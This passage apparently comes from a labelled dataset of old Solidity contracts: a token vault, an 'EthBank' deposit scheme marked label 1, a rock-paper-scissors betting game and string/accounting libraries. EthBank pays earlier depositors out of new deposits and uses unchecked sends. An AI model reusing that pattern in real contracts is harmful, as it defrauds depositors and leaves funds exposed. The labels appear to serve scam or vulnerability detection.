investors, uint count);\r\r\n\r\r\n  event Locked();\r\r\n\r\r\n  \/**\r\r\n   * Create presale contract where lock up period is given days\r\r\n   *\r\r\n   * @param _owner Who can load investor data and lock\r\r\n   * @param _freezeEndsAt UNIX timestamp when the vault unlocks\r\r\n   * @param _token Token contract address we are distributing\r\r\n   * @param _tokensToBeAllocated Total number of tokens this vault will hold - including decimal multiplcation\r\r\n   *\r\r\n   *\/\r\r\n  function TokenVault(address _owner, uint _freezeEndsAt, StandardToken _token, uint _tokensToBeAllocated) {\r\r\n\r\r\n    owner = _owner;\r\r\n\r\r\n    \/\/ Invalid owenr\r\r\n    if(owner == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    token = _token;\r\r\n\r\r\n    \/\/ Check the address looks like a token contract\r\r\n    if(!token.isToken()) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Give argument\r\r\n    if(_freezeEndsAt == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Sanity check on _tokensToBeAllocated\r\r\n    if(_tokensToBeAllocated == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    freezeEndsAt = _freezeEndsAt;\r\r\n    tokensToBeAllocated = _tokensToBeAllocated;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Add a presale participating allocation\r\r\n  function setInvestor(address investor, uint amount) public onlyOwner {\r\r\n\r\r\n    if(lockedAt > 0) {\r\r\n      \/\/ Cannot add new investors after the vault is locked\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    if(amount == 0) throw; \/\/ No empty buys\r\r\n\r\r\n    \/\/ Don&#39;t allow reset\r\r\n    if(balances[investor] > 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    balances[investor] = amount;\r\r\n\r\r\n    investorCount++;\r\r\n\r\r\n    tokensAllocatedTotal += amount;\r\r\n\r\r\n    Allocated(investor, amount);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Lock the vault\r\r\n  \/\/\/      - All balances have been loaded in correctly\r\r\n  \/\/\/      - Tokens are transferred on this vault correctly\r\r\n  \/\/\/      - Checks are in place to prevent creating a vault that is locked with incorrect token balances.\r\r\n  function lock() onlyOwner {\r\r\n\r\r\n    if(lockedAt > 0) {\r\r\n      throw; \/\/ Already locked\r\r\n    }\r\r\n\r\r\n    \/\/ Spreadsheet sum does not match to what we have loaded to the investor data\r\r\n    if(tokensAllocatedTotal != tokensToBeAllocated) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Do not lock the vault if the given tokens are not on this contract\r\r\n    if(token.balanceOf(address(this)) != tokensAllocatedTotal) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    lockedAt = now;\r\r\n\r\r\n    Locked();\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev In the case locking failed, then allow the owner to reclaim the tokens on the contract.\r\r\n  function recoverFailedLock() onlyOwner {\r\r\n    if(lockedAt > 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Transfer all tokens on this contract back to the owner\r\r\n    token.transfer(owner, token.balanceOf(address(this)));\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Get the current balance of tokens in the vault\r\r\n  \/\/\/ @return uint How many tokens there are currently in vault\r\r\n  function getBalance() public constant returns (uint howManyTokensCurrentlyInVault) {\r\r\n    return token.balanceOf(address(this));\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Claim N bought tokens to the investor as the msg sender\r\r\n  function claim() {\r\r\n\r\r\n    address investor = msg.sender;\r\r\n\r\r\n    if(lockedAt == 0) {\r\r\n      throw; \/\/ We were never locked\r\r\n    }\r\r\n\r\r\n    if(now < freezeEndsAt) {\r\r\n      throw; \/\/ Trying to claim early\r\r\n    }\r\r\n\r\r\n    if(balances[investor] == 0) {\r\r\n      \/\/ Not our investor\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    if(claimed[investor] > 0) {\r\r\n      throw; \/\/ Already claimed\r\r\n    }\r\r\n\r\r\n    uint amount = balances[investor];\r\r\n\r\r\n    claimed[investor] = amount;\r\r\n\r\r\n    totalClaimed += amount;\r\r\n\r\r\n    token.transfer(investor, amount);\r\r\n\r\r\n    Distributed(investor, amount);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Resolve the contract umambigious state\r\r\n  function getState() public constant returns(State) {\r\r\n    if(lockedAt == 0) {\r\r\n      return State.Loading;\r\r\n    } else if(now > freezeEndsAt) {\r\r\n      return State.Distributing;\r\r\n    } else {\r\r\n      return State.Holding;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"\/\/***********************************ETH BANK\r\r\n\/\/\r\r\n\/\/ It&#39;s an EthBank, every depositor earns interest on their deposits when a new depositor joins!\r\r\n\/\/\r\r\n\/\/ The interest rate is defined by the \"Interest_Rate\" variable, and is initially set to 2%, and may be changed later!\r\r\n\/\/\r\r\n\/\/ The Bank will exist for long because it only pays out when the balance is above 60%. And if the balance is below 80% it pays out only half the interest.\r\r\n\/\/\r\r\n\/\/ Minimum Deposit: 0.2 Ether (200 Finney)\r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ It is a long term project, so have fun saving your Ether here!\r\r\n\/\/\r\r\n\/\/***********************************START\r\r\ncontract EthBank {\r\r\n\r\r\n  struct InvestorArray \r\r\n\t{\r\r\n      \taddress etherAddress;\r\r\n      \tuint amount;\r\r\n  \t}\r\r\n\r\r\n  InvestorArray[] public depositors;\r\r\n\r\r\n\/\/********************************************PUBLIC VARIABLES\r\r\n\r\r\n  uint public Total_Savers=0;\r\r\n  uint public Fees=0;\r\r\n  uint public Balance = 0;\r\r\n  uint public Total_Deposited=0;\r\r\n  uint public Total_Paid_Out=0;\r\r\n  uint public Interest_Rate=2; \/\/ the interest rate payout for deposits!\r\r\nstring public Message=\"Welcome to EthBank\";\r\r\n\t\r\r\n  address public owner;\r\r\n\r\r\n  \/\/ simple single-sig function modifier\r\r\n  modifier onlyowner { if (msg.sender == owner) _ }\r\r\n\r\r\n\/\/********************************************INIT\r\r\n\r\r\n  function EthBank() {\r\r\n    owner = 0xEe462A6717f17C57C826F1ad9b4d3813495296C9;  \/\/this contract is an attachment to EthVentures\r\r\n  }\r\r\n\r\r\n\/\/********************************************TRIGGER\r\r\n\r\r\n  function() {\r\r\n    enter();\r\r\n  }\r\r\n  \r\r\n\/\/********************************************ENTER\r\r\n\r\r\n  function enter() {\r\r\n    if (msg.value > 200 finney) {\r\r\n\r\r\n    uint amount=msg.value;\r\r\n\r\r\n\r\r\n    \/\/ add a new participant to the system and calculate total players\r\r\n    Total_Savers=depositors.length+1;\r\r\n    depositors.length += 1;\r\r\n    depositors[depositors.length-1].etherAddress = msg.sender;\r\r\n    depositors[depositors.length-1].amount = amount;\r\r\n\r\r\n\r\r\n\r\r\n    \/\/ collect Fees and update contract Balance and deposited amount\r\r\n      \tFees  = amount * Interest_Rate \/ 100;    \/\/ fee to the owner\r\r\n      \tTotal_Deposited+=amount;       \t\t\/\/update deposited amount\r\r\n\tamount-=amount * Interest_Rate \/ 100;\t\/\/ minus the fee from amount\r\r\n      \tBalance += amount;               \/\/ Balance update\r\r\n\r\r\n\r\r\n\/\/********************************EthVenturesFinal Fee Plugin\r\r\n    \/\/ payout Fees to the owner\r\r\n     if (Fees != 0) \r\r\n     {\r\r\n\tuint minimal= 1990 finney;\r\r\n\tif(Fees<minimal)\r\r\n\t{\r\r\n      \towner.send(Fees);\t\t\/\/send fee to owner\r\r\n\tTotal_Paid_Out+=Fees;        \/\/update paid out amount\r\r\n\t}\r\r\n\telse\r\r\n\t{\r\r\n\tuint Times= Fees\/minimal;\r\r\n\r\r\n\tfor(uint i=0; i<Times;i++)   \/\/ send the Fees out in packets compatible to EthVentures dividend function\r\r\n\tif(Fees>0)\r\r\n\t{\r\r\n\towner.send(minimal);\t\t\/\/send fee to owner\r\r\n\tTotal_Paid_Out+=Fees;        \/\/update paid out amount\r\r\n\tFees-=minimal;\r\r\n\t}\r\r\n\t}\r\r\n     }\r\r\n\/\/********************************End Plugin \r\r\n \/\/loop variables\r\r\n    uint payout;\r\r\n    uint nr=0;\r\r\n\r\r\nif(Total_Deposited * 80\/100 < Balance )  \/\/if balance is at 80% or higher, then pay depositors\r\r\n{\r\r\n  \r\r\n\r\r\n\t\r\r\n    while (Balance > depositors[nr].amount * Interest_Rate\/100 && nr<depositors.length)  \/\/exit condition to avoid infinite loop\r\r\n    { \r\r\n      payout = depositors[nr].amount *Interest_Rate\/100;                           \/\/calculate pay out\r\r\n      depositors[nr].etherAddress.send(payout);                        \t\t\/\/send pay out to participant\r\r\n      Balance -= depositors[nr].amount *Interest_Rate\/100;                         \/\/Balance update\r\r\n      Total_Paid_Out += depositors[nr].amount *Interest_Rate\/100;                 \/\/update paid out amount\r\r\n      nr += 1;                                                                         \/\/go to next participant\r\r\n    }\r\r\n    \r\r\n\tMessage=\"The Full Interest has been paid to Depositors!\";\r\r\n} \r\r\nelse  \r\r\n{\r\r\nif(Total_Deposited * 60\/100 < Balance )  \/\/if balance is at 60% or higher, then pay depositors with half interest\r\r\n{\r\r\n  \r\r\n\r\r\n\t\r\r\n    while (Balance > depositors[nr].amount * Interest_Rate\/200 && nr<depositors.length)  \/\/exit condition to avoid infinite loop\r\r\n    { \r\r\n      payout = depositors[nr].amount *Interest_Rate\/200;                           \/\/calculate pay out\r\r\n      depositors[nr].etherAddress.send(payout);                        \t\t\/\/send pay out to participant\r\r\n      Balance -= depositors[nr].amount *Interest_Rate\/200;                         \/\/Balance update\r\r\n      Total_Paid_Out += depositors[nr].amount *Interest_Rate\/200;                 \/\/update paid out amount\r\r\n      nr += 1;                                                                         \/\/go to next participant\r\r\n    }\r\r\n    \r\r\n\tMessage=\"Funds are between 60% and 80%, so only Half Interest has been paid!\";\r\r\n} \r\r\nelse Message=\"Funds are below 60%, no interest payout until new Depositors join!\";\r\r\n\r\r\n\r\r\n\r\r\n}\r\r\n\r\r\n  }\r\r\n\r\r\n\/\/********************************************SET INTEREST RATE\r\r\n}\r\r\n\r\r\n  function Set_Interest_Rate(uint new_interest) onlyowner  \/\/set new interest rate\r\r\n\t{\r\r\n      \tInterest_Rate = new_interest;\r\r\n\tMessage=\"The Bank has changed it&#39;s Interest Rates!\";\r\r\n  \t}\r\r\n\r\r\n}","label":1}
{"code":"\/\/                       , ; ,   .-&#39;\"\"\"&#39;-.   , ; ,\r\r\n\/\/                       \\\\|\/  .&#39;          &#39;.  \\|\/\/\r\r\n\/\/                        \\-;-\/   ()   ()   \\-;-\/\r\r\n\/\/                        \/\/ ;               ; \\\\\r\r\n\/\/                       \/\/__; :.         .; ;__\\\\\r\r\n\/\/                      `-----\\&#39;.&#39;-.....-&#39;.&#39;\/-----&#39;\r\r\n\/\/                             &#39;.&#39;.-.-,_.&#39;.&#39;\r\r\n\/\/                               &#39;(  (..-&#39;\r\r\n\/\/                                 &#39;-&#39;\r\r\n\/\/   WHYSOS3RIOUS   PRESENTS :                          \r\r\n\/\/                                                                \r\r\n\/\/   ROCK PAPER SCISSORS\r\r\n\/\/   Challenge an opponent with an encrypted hand\r\r\n\/\/   www.matching-ethers.com\/rps                 \r\r\n\/\/\r\r\n\/\/\r\r\n\/\/ *** coded by WhySoS3rious, 2016.                                       ***\/\/\r\r\n\/\/ *** please do not copy without authorization                          ***\/\/\r\r\n\/\/ *** contact : reddit    \/u\/WhySoS3rious                               ***\/\/\r\r\n\r\r\n\/\/          STAKE : 0.1 ETH\r\r\n\/\/          DRAW : Full refund\r\r\n\/\/          WIN : 0.198 ETH (house : 0.002)\r\r\n\/\/          EXPIRATION TIME : 24 hour after duel starts (refreshed when one player reveals)\r\r\n\/\/          If only one player reveals, he wins after 24 hour if the other doesn&#39;t reveal\r\r\n\/\/          he will be paid automatically when other ppl play the game.\r\r\n\/\/          If both player don&#39;t reveal and forget the bet, it is refunded (-house)\r\r\n\r\r\n\/\/         HOW TO PLAY ?\r\r\n\/\/         1- Send a encrypted Hand (generated on the game&#39;s website or by yourself)\r\r\n\/\/         2- Wait for opponent (can cancel if you wish)\r\r\n\/\/         3- Once matched, reveal your hand with the appropriate function and your secret\r\r\n\/\/         4- Wait for your duel to resolve and the automatic payout\r\r\n\r\r\n\/\/         ENCRYPT YOUR HAND\r\r\n\/\/         Encrypt your hands on the website or\r\r\n\/\/         directly with web3.js :  web3.sha3(secret+hand)\r\r\n\r\r\n\/\/ exemple results with secret = \"testing\"\r\r\n\/\/hand = \"rock\" :  web3.sha3(\"testing\"+\"rock\")\r\r\n\/\/ 0x8935dc293ca2ee08e33bad4f4061699a8f59ec637081944145ca19cbc8b39473\r\r\n\/\/hand = \"paper\" : \r\r\n\/\/ 0x859743aa01286a6a1eba5dbbcc4cf8eeaf1cc953a3118799ba290afff7125501\r\r\n\/\/hand = \"scissors\" : \r\r\n\/\/0x35ccbb689808295e5c51510ed28a96a729e963a12d09c4a7a4ba000c9777e897\r\r\n\r\r\ncontract Crypted_RPS\r\r\n{\r\r\n    address owner;\r\r\n    uint256 gambleValue;\r\r\n    uint256 expirationTime;\r\r\n    uint256 house;\r\r\n    uint256 houseTotal;\r\r\n    modifier noEthSent(){\r\r\n        if (msg.value>0) msg.sender.send(msg.value);\r\r\n        _\r\r\n    }\r\r\n    modifier onlyOwner() {\r\r\n\t    if (msg.sender!=owner) throw;\r\r\n\t    _\r\r\n    }\r\r\n    modifier equalGambleValue() {\r\r\n\tif (msg.value < gambleValue) throw;\r\r\n        if (msg.value > gambleValue) msg.sender.send(msg.value-gambleValue);\r\r\n\t_\r\r\n    }\r\r\n\r\r\n    struct PlayerWaiting\r\r\n    {\r\r\n        bool full;\r\r\n        address player;\r\r\n        bytes32 cryptedHand;\r\r\n    }\r\r\n    PlayerWaiting playerWaiting;\r\r\n\r\r\n    struct Duel2Decrypt\r\r\n    {\r\r\n\taddress player_1;\r\r\n        bytes32 cryptedHand_1;\r\r\n        address player_2;\r\r\n \tbytes32 cryptedHand_2;\r\r\n        bool decrypted;\r\r\n        uint256 timeStamp;\r\r\n    }\r\r\n    Duel2Decrypt[] duels2Decrypt;\r\r\n    uint firstActiveDuel2; \/\/index of first Duel 2 not decrypted\r\r\n\r\r\n    struct Duel1Decrypt\r\r\n   {\r\r\n\taddress player_1;\r\r\n        string hand_1;\r\r\n        address player_2;\r\r\n\tbytes32 cryptedHand_2;\r\r\n        bool decrypted;\r\r\n        uint256 timeStamp;\r\r\n    }\r\r\n    Duel1Decrypt[] duels1Decrypt;\r\r\n    uint firstActiveDuel1;\r\r\n\r\r\n    struct Result  \r\r\n    {\r\r\n       address player_1;\r\r\n       string hand_1;\r\r\n       address player_2;\r\r\n       string hand_2;\r\r\n       uint result; \/\/0 draw, 1 wins, 2 wins\r\r\n    }\r\r\n    Result[] results;\r\r\n\r\r\n\r\r\n    mapping (address => uint) player_progress;\r\r\n    \/\/ 0 not here, 1 waiting, 2 2crypted, 3 1crypted\r\r\n    mapping (address => uint) player_bet_id;\r\r\n    mapping (address => uint) player_bet_position;\r\r\n\r\r\n    function getPlayerStatus(address player, uint option) constant returns (uint result)\r\r\n    {\r\r\n         if (option==0) {result = player_progress[player];}\r\r\n         else if (option==1) {result= player_bet_id[player];}\r\r\n         else if (option==2) {result = player_bet_position[player];}\r\r\n         return result;\r\r\n    }\r\r\n\r\r\n\r\r\n    mapping (string => mapping(string => int)) payoffMatrix;\r\r\n    \/\/constructor\r\r\n    function Crypted_RPS()\r\r\n    {\r\r\n\towner= msg.sender;\r\r\n\tgambleValue = 100000 szabo;\r\r\n        house = 1000 szabo;\r\r\n        expirationTime = 86400;   \/\/24 hour\r\r\n        payoffMatrix[\"rock\"][\"rock\"] = 0;\r\r\n        payoffMatrix[\"rock\"][\"paper\"] = 2;\r\r\n        payoffMatrix[\"rock\"][\"scissors\"] = 1;\r\r\n        payoffMatrix[\"paper\"][\"rock\"] = 1;\r\r\n        payoffMatrix[\"paper\"][\"paper\"] = 0;\r\r\n        payoffMatrix[\"paper\"][\"scissors\"] = 2;\r\r\n        payoffMatrix[\"scissors\"][\"rock\"] = 2;\r\r\n        payoffMatrix[\"scissors\"][\"paper\"] = 1;\r\r\n        payoffMatrix[\"scissors\"][\"scissors\"] = 0;\r\r\n    }\r\r\n\r\r\n    function () {throw;} \/\/no callback, use the functions to play\r\r\n\r\r\n    modifier payexpired2Duel{\r\r\n        if (duels2Decrypt.length>firstActiveDuel2 && duels2Decrypt[firstActiveDuel2].timeStamp + expirationTime <= now) {\r\r\n            duels2Decrypt[firstActiveDuel2].player_1.send(gambleValue-house);\r\r\n            duels2Decrypt[firstActiveDuel2].player_2.send(gambleValue-house);\r\r\n            houseTotal+=2*house;\r\r\n            player_progress[duels2Decrypt[firstActiveDuel2].player_1]=0;\r\r\n            player_progress[duels2Decrypt[firstActiveDuel2].player_2]=0;\r\r\n            duels2Decrypt[firstActiveDuel2].decrypted = true;\r\r\n            updateFirstDuel2(firstActiveDuel2);\r\r\n        }\r\r\n        _\r\r\n    }\r\r\n\r\r\n    modifier payexpired1Duel{\r\r\n        if (duels1Decrypt.length>firstActiveDuel1 && (duels1Decrypt[firstActiveDuel1].timeStamp + expirationTime) < now) {\r\r\n            duels1Decrypt[firstActiveDuel1].player_1.send(2*(gambleValue-house));\r\r\n            houseTotal+=2*house;\r\r\n            duels1Decrypt[firstActiveDuel1].decrypted = true;\r\r\n            player_progress[duels1Decrypt[firstActiveDuel1].player_1]=0;\r\r\n            player_progress[duels1Decrypt[firstActiveDuel1].player_2]=0;\r\r\n            results.push(Result(duels1Decrypt[firstActiveDuel1].player_1, duels1Decrypt[firstActiveDuel1].hand_1, duels1Decrypt[firstActiveDuel1].player_2,\"expired\", 1));\r\r\n            updateFirstDuel1(firstActiveDuel1);\r\r\n           \r\r\n        }\r\r\n        _\r\r\n    }\r\r\n        \r\r\n\r\r\n    function cancelWaitingForOpponent()\r\r\n    noEthSent {\r\r\n        if (msg.sender==playerWaiting.player && playerWaiting.full)\r\r\n        {\r\r\n             msg.sender.send(gambleValue);\r\r\n             playerWaiting.full=false;\r\r\n             player_progress[msg.sender]=0;\r\r\n        }\r\r\n        else { throw;}\r\r\n    }\t\r\r\n\r\r\n\r\r\n    function sendCryptedHand(bytes32 cryptedH)\r\r\n    equalGambleValue\r\r\n    payexpired2Duel\r\r\n    payexpired1Duel\r\r\n    {\r\r\n          uint progress = player_progress[msg.sender];\r\r\n          uint position = player_bet_position[msg.sender];\r\r\n          \/\/one not resolved duel per player only\r\r\n          if ( progress==3 && position==1 )throw;\r\r\n          if (progress == 2 ) throw; \r\r\n          if (progress ==  1 ) throw; \/\/no selfdueling\r\r\n          if (!playerWaiting.full) \r\r\n          {\r\r\n              playerWaiting.player=msg.sender;\r\r\n              playerWaiting.cryptedHand= cryptedH;\r\r\n              playerWaiting.full=true;\r\r\n              player_progress[msg.sender]=1;\r\r\n          }\r\r\n          else\r\r\n          {\r\r\n               duels2Decrypt.push( Duel2Decrypt(playerWaiting.player, playerWaiting.cryptedHand, msg.sender, cryptedH, false, now) );\r\r\n                player_progress[playerWaiting.player]=2;\r\r\n                player_bet_id[playerWaiting.player]=duels2Decrypt.length-1;\r\r\n                player_bet_position[playerWaiting.player]=0;\r\r\n                player_progress[msg.sender]=2;\r\r\n                player_bet_id[msg.sender]=duels2Decrypt.length-1;\r\r\n                player_bet_position[msg.sender]=1;         \r\r\n                playerWaiting.full=false;\r\r\n          }\r\r\n\r\r\n    }\r\r\n\r\r\n\r\r\n    function revealRock(string secret)\r\r\n    {\r\r\n        bytes32 hashRevealed = sha3(secret, \"rock\");\r\r\n        reveal(hashRevealed, \"rock\");\r\r\n    }\r\r\n    function revealPaper(string secret)\r\r\n    {\r\r\n        bytes32 hashRevealed = sha3(secret, \"paper\");\r\r\n        reveal(hashRevealed, \"paper\");\r\r\n    }\r\r\n    function revealScissors(string secret)\r\r\n    {\r\r\n        bytes32 hashRevealed = sha3(secret, \"scissors\");\r\r\n        reveal(hashRevealed, \"scissors\");\r\r\n    }\r\r\n\r\r\n    function reveal(bytes32 hashRevealed, string hand) private\r\r\n    noEthSent\r\r\n   {\r\r\n\r\r\n        uint progress =  getPlayerStatus(msg.sender,0);\r\r\n        uint bet_id     =  getPlayerStatus(msg.sender,1);\r\r\n        uint position  =  getPlayerStatus(msg.sender,2);\r\r\n        \r\r\n\r\r\n        bytes32 hashStored;        \r\r\n        if (progress==2)  \/\/duel not revealed\r\r\n        { \r\r\n            if (position == 0)\r\r\n            {\r\r\n                 hashStored = duels2Decrypt[bet_id].cryptedHand_1;\r\r\n            }\r\r\n            else\r\r\n            {\r\r\n                 hashStored = duels2Decrypt[bet_id].cryptedHand_2;\r\r\n            }\r\r\n        }\r\r\n        else if (progress==3 && position==1) \/\/duel half revealed already\r\r\n        { \r\r\n                hashStored = duels1Decrypt[bet_id].cryptedHand_2;\r\r\n        }\r\r\n        else { throw;} \/\/player has nothing to reveal\r\r\n\r\r\n\tif (hashStored==hashRevealed)\r\r\n        {\r\r\n              decryptHand(hand, progress, bet_id, position);\r\r\n        }\r\r\n        else\r\r\n        {\r\r\n             throw; \/\/wrong secret or hand\r\r\n         }\r\r\n    }\r\r\n    \r\r\n    function  decryptHand(string hand, uint progress, uint bet_id, uint position) private\r\r\n    {\r\r\n             address op_add;\r\r\n             bytes32 op_cH;\r\r\n\r\r\n         if (progress==2)\r\r\n         {  \r\r\n             if (position==0) \r\r\n             {\r\r\n                 op_add = duels2Decrypt[bet_id].player_2;\r\r\n                 op_cH = duels2Decrypt[bet_id].cryptedHand_2;\r\r\n\r\r\n             }\r\r\n             else\r\r\n             {\r\r\n                 op_add = duels2Decrypt[bet_id].player_1;\r\r\n                 op_cH = duels2Decrypt[bet_id].cryptedHand_1;\r\r\n             }\r\r\n\r\r\n              duels1Decrypt.push(Duel1Decrypt(msg.sender,hand,op_add, op_cH, false, now));\r\r\n              duels2Decrypt[bet_id].decrypted=true;\r\r\n              updateFirstDuel2(bet_id);\r\r\n              player_progress[msg.sender]=3;\r\r\n              player_bet_id[msg.sender]=duels1Decrypt.length-1;\r\r\n              player_bet_position[msg.sender]=0;\r\r\n              player_progress[op_add]=3;\r\r\n              player_bet_id[op_add]=duels1Decrypt.length-1;\r\r\n              player_bet_position[op_add]=1;\r\r\n\r\r\n         }\r\r\n         else if (progress==3 && position==1)\r\r\n         {\r\r\n              op_add = duels1Decrypt[bet_id].player_1;\r\r\n              string op_h = duels1Decrypt[bet_id].hand_1;\r\r\n              duels1Decrypt[bet_id].decrypted=true;\r\r\n              uint result = payDuel(op_add, op_h, msg.sender, hand);\r\r\n              results.push(Result(op_add, op_h, msg.sender,hand, result));\r\r\n              updateFirstDuel1(bet_id);\r\r\n              player_progress[msg.sender]=0;\r\r\n              player_progress[op_add]=0;\r\r\n          }\r\r\n     }\r\r\n\r\r\n     function updateFirstDuel2(uint bet_id) private\r\r\n     {\r\r\n         if (bet_id==firstActiveDuel2)\r\r\n         {   \r\r\n              uint index;\r\r\n              while (true) {\r\r\n                 if (index<duels2Decrypt.length && duels2Decrypt[index].decrypted){\r\r\n                     index=index+1;\r\r\n                 }\r\r\n                 else {break; }\r\r\n              }\r\r\n              firstActiveDuel2=index;\r\r\n              return;\r\r\n          }\r\r\n      }\r\r\n\r\r\n     function updateFirstDuel1(uint bet_id) private\r\r\n     {\r\r\n         if (bet_id==firstActiveDuel1)\r\r\n         {   \r\r\n              uint index;\r\r\n              while (true) {\r\r\n                 if (index<duels1Decrypt.length && duels1Decrypt[index].decrypted){\r\r\n                     index=index+1;\r\r\n                 }\r\r\n                 else {break; }\r\r\n              }\r\r\n              firstActiveDuel1=index;\r\r\n              return;\r\r\n          }\r\r\n      }\r\r\n\r\r\n     \/\/ in case there is too much expired duels in queue for automatic payout, \r\r\n     \/\/I can help to catch up\r\r\n     function manualPayExpiredDuel() \r\r\n     onlyOwner\r\r\n     payexpired2Duel\r\r\n     payexpired1Duel\r\r\n     noEthSent\r\r\n     {\r\r\n         return;\r\r\n     }\r\r\n\r\r\n     \/\/payout\r\r\n     function payDuel(address player_1, string hand_1, address player_2, string hand_2) private returns(uint result) \r\r\n     {\r\r\n              if (payoffMatrix[hand_1][hand_2]==0) \/\/draw\r\r\n              {player_1.send(gambleValue); player_2.send(gambleValue); result=0;}\r\r\n              else if (payoffMatrix[hand_1][hand_2]==1) \/\/1 win\r\r\n              {player_1.send(2*(gambleValue-house)); result=1; houseTotal+=2*house;}\r\r\n              if (payoffMatrix[hand_1][hand_2]==2) \/\/2 wins\r\r\n              {player_2.send(2*(gambleValue-house)); result=2; houseTotal+=2*house;}\r\r\n              return result;\r\r\n      }\r\r\n\r\r\n     function payHouse() \r\r\n     onlyOwner\r\r\n     noEthSent {\r\r\n         owner.send(houseTotal);\r\r\n         houseTotal=0;\r\r\n     }\r\r\n\r\r\n     function getFirstActiveDuel1() constant returns(uint fAD1) {\r\r\n         return firstActiveDuel1;}\r\r\n     function getLastDuel1() constant returns(uint lD1) {\r\r\n         return duels1Decrypt.length;}\r\r\n     function getDuel1(uint index) constant returns(address p1, string h1, address p2, bool dC, uint256 tS) {\r\r\n         p1 = duels1Decrypt[index].player_1;\r\r\n         h1 = duels1Decrypt[index].hand_1;\r\r\n         p2 = duels1Decrypt[index].player_2;\r\r\n         dC = duels1Decrypt[index].decrypted;\r\r\n         tS  = duels1Decrypt[index].timeStamp;\r\r\n     }\r\r\n\r\r\n     function getFirstActiveDuel2() constant returns(uint fAD2) {\r\r\n         return firstActiveDuel2;}\r\r\n     function getLastDuel2() constant returns(uint lD2) {\r\r\n         return duels2Decrypt.length;}\r\r\n     function getDuel2(uint index) constant returns(address p1, address p2, bool dC, uint256 tS) {\r\r\n         p1 = duels2Decrypt[index].player_1;\r\r\n         p2 = duels2Decrypt[index].player_2;\r\r\n         dC = duels2Decrypt[index].decrypted;\r\r\n         tS  = duels2Decrypt[index].timeStamp;\r\r\n     }\r\r\n\r\r\n     function getPlayerWaiting() constant returns(address p, bool full) {\r\r\n         p = playerWaiting.player;\r\r\n         full = playerWaiting.full;\r\r\n     }\r\r\n\r\r\n     function getLastResult() constant returns(uint lD2) {\r\r\n         return results.length;}\r\r\n     function getResults(uint index) constant returns(address p1, string h1, address p2, string h2, uint r) {\r\r\n         p1 = results[index].player_1;\r\r\n         h1 = results[index].hand_1;\r\r\n         p2 = results[index].player_2;\r\r\n         h2 = results[index].hand_2;\r\r\n         r = results[index].result;\r\r\n     }\r\r\n\r\r\n\r\r\n}","label":0}
{"code":"\/\/ String Utils v0.1\r\r\n\r\r\n\/\/\/ @title String Utils - String utility functions\r\r\n\/\/\/ @author Piper Merriam - \r\r\nlibrary StringLib {\r\r\n    \/*\r\r\n     *  Address: 0x443b53559d337277373171280ec57029718203fb\r\r\n     *\/\r\r\n\r\r\n    \/\/\/ @dev Converts an unsigned integert to its string representation.\r\r\n    \/\/\/ @param v The number to be converted.\r\r\n    function uintToBytes(uint v) constant returns (bytes32 ret) {\r\r\n        if (v == 0) {\r\r\n            ret = &#39;0&#39;;\r\r\n        }\r\r\n        else {\r\r\n            while (v > 0) {\r\r\n                ret = bytes32(uint(ret) \/ (2 ** 8));\r\r\n                ret |= bytes32(((v % 10) + 48) * 2 ** (8 * 31));\r\r\n                v \/= 10;\r\r\n            }\r\r\n        }\r\r\n        return ret;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Converts a numeric string to it&#39;s unsigned integer representation.\r\r\n    \/\/\/ @param v The string to be converted.\r\r\n    function bytesToUInt(bytes32 v) constant returns (uint ret) {\r\r\n        if (v == 0x0) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        uint digit;\r\r\n\r\r\n        for (uint i = 0; i < 32; i++) {\r\r\n            digit = uint((uint(v) \/ (2 ** (8 * (31 - i)))) & 0xff);\r\r\n            if (digit == 0) {\r\r\n                break;\r\r\n            }\r\r\n            else if (digit < 48 || digit > 57) {\r\r\n                throw;\r\r\n            }\r\r\n            ret *= 10;\r\r\n            ret += (digit - 48);\r\r\n        }\r\r\n        return ret;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ Accounting v0.1 (not the same as the 0.1 release of this library)\r\r\n\r\r\n\/\/\/ @title Accounting Lib - Accounting utilities\r\r\n\/\/\/ @author Piper Merriam - \r\r\nlibrary AccountingLib {\r\r\n        \/*\r\r\n         *  Address: 0x7de615d8a51746a9f10f72a593fb5b3718dc3d52\r\r\n         *\/\r\r\n        struct Bank {\r\r\n            mapping (address => uint) accountBalances;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Low level method for adding funds to an account.  Protects against overflow.\r\r\n        \/\/\/ @param self The Bank instance to operate on.\r\r\n        \/\/\/ @param accountAddress The address of the account the funds should be added to.\r\r\n        \/\/\/ @param value The amount that should be added to the account.\r\r\n        function addFunds(Bank storage self, address accountAddress, uint value) public {\r\r\n                if (self.accountBalances[accountAddress] + value < self.accountBalances[accountAddress]) {\r\r\n                        \/\/ Prevent Overflow.\r\r\n                        throw;\r\r\n                }\r\r\n                self.accountBalances[accountAddress] += value;\r\r\n        }\r\r\n\r\r\n        event _Deposit(address indexed _from, address indexed accountAddress, uint value);\r\r\n        \/\/\/ @dev Function wrapper around the _Deposit event so that it can be used by contracts.  Can be used to log a deposit to an account.\r\r\n        \/\/\/ @param _from The address that deposited the funds.\r\r\n        \/\/\/ @param accountAddress The address of the account the funds were added to.\r\r\n        \/\/\/ @param value The amount that was added to the account.\r\r\n        function Deposit(address _from, address accountAddress, uint value) public {\r\r\n            _Deposit(_from, accountAddress, value);\r\r\n        }\r\r\n\r\r\n\r\r\n        \/\/\/ @dev Safe function for depositing funds. 